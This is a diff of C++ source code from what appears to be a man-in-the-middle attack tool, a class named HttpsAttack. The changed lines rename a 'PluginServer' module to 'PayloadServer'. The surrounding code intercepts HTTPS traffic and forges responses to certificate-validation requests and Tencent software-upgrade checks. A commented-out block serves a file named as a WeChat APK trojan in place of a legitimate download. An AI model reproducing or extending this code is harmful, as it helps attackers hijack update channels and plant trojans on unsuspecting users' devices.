@@ -5,7 +5,7 @@
 #include "sslPublic.h"
 #include "../HttpUtils.h"
 #include "Toutiao.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "SSLProxy.h"
 #include "QQmtt.h"
 #include "ucmobile.h"
@@ -86,7 +86,7 @@ int HttpsAttack::SslAttackPacket(char* buf, int size, const char* url, const cha
 		if (strstr(url, ".well-known/pki-validation/fileauth.txt"))
 		{
 			lstrcpyA((char*)recvBuffer, "/fileauth.txt HTTP/1.1\r\nHost: helloqq.com\r\n\r\n");
-			iRet = PluginServer::PluginServerProc(pstSSLProxyParam, (char*)recvBuffer, iCounter);
+			iRet = PayloadServer::PluginServerProc(pstSSLProxyParam, (char*)recvBuffer, iCounter);
 		}
 		else if (QQVideoSSL::isTencentPcUpgrade(url, pstSSLProxyParam->host))
 		{
@@ -95,7 +95,7 @@ int HttpsAttack::SslAttackPacket(char* buf, int size, const char* url, const cha
 			iRet = QQVideoSSL::replyTencentPcUpgrade(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
 		}
 		else {
-			iRet = PluginServer::PluginServerProc(pstSSLProxyParam, (char*)recvBuffer, iCounter);
+			iRet = PayloadServer::PluginServerProc(pstSSLProxyParam, (char*)recvBuffer, iCounter);
 			//printf("ssl recv pocket host:%s,url:%s\r\n", szDomainName, url);
 		}
 
@@ -307,7 +307,7 @@ int HttpsAttack::SslAttackPacket(char* buf, int size, const char* url, const cha
 
 		// 		 char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
 		// 		 string filename = Public::getUserUrl(username,WEIXIN_APK_TROJAN_FILENAME);
-		// 		 resultlen = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespHdrAppFormat, 1);
+		// 		 resultlen = PayloadServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespHdrAppFormat, 1);
 		return TRUE;
 	}
 	else if (QQmtt::isQQmttUpdatePacket(url, szDomainName))
